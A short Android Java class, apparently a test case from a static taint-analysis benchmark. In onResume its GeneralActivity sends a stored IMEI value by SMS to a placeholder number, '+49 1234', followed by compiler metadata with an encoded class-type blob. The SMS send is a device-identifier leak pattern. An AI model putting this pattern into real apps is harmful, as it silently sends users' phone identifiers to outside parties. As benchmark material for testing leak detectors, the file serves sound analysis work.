package de.ecspride;

import android.app.Activity;
import android.telephony.SmsManager;

public class GeneralActivity extends Activity {
    protected static String imei = null;
    
    @Override
    public void onResume() {
        super.onResume();
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, imei, null, null);
    }
    
    public GeneralActivity() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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");
}
